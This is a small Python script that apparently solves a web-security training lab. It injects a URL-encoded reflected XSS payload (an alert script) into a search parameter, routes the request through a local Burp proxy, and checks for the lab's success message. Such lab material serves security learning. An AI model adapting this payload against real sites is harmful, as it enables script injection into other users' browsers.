import requests
import sys
import urllib3

# disable the ssl warning

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# set the burp proxy

proxies={
    
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def execute_xss(url,s):
    # code here
    # we have to give a payload here
    payload="%22%3E%3Cscript%3Ealert%28%27Hacked+by+rakshak07%27%29%3C%2Fscript%3E"
    path=f"{url}/?search={payload}"
    # we have to send a get request here hai ta
    r=s.get(path,verify=False,proxies=proxies)
    print("[+] Exploiting the xss..........................🔥")
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successfully found the xss vulnerability")
        exit(0)
    else:
        print("[-] There is something error in the payload check again and then you will found xss")
        exit(1)





def main(): # This line checks whether the current file is being run directly (not imported from somewhere else)
        # code here
        # give user the instruction
        if len(sys.argv)!=2:
            print("[+] Usage: %s <url>" % sys.argv[0])
            print("[+] Example: %s www.example.com" % sys.argv[0])
            sys.exit(-1)
            
        else:
            url=sys.argv[1]
            s=requests.Session()
            execute_xss(url,s)    
            
            
            
            
            
 
if __name__=="__main__":
    main()